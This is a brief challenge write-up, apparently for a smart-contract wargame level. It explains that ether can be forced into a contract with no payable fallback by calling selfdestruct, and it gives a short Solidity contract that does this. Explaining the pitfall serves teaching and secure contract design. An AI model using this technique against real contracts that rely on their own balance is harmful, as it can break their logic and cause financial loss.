The goal is to send ether to the contract.
Usually, sending ether to a contract requires a fallback function to be implemented, but one can force-send ether by calling the selfdestruct instruction on a contract containing ether. 
This instruction bypasses any checks.

A simple selfdestruct contract to solve this challenge looks like this:

pragma solidity ^0.7.3;

contract ForceSend {

    constructor (address payable target) payable {
        require(msg.value > 0);
        selfdestruct(target);
    }
}
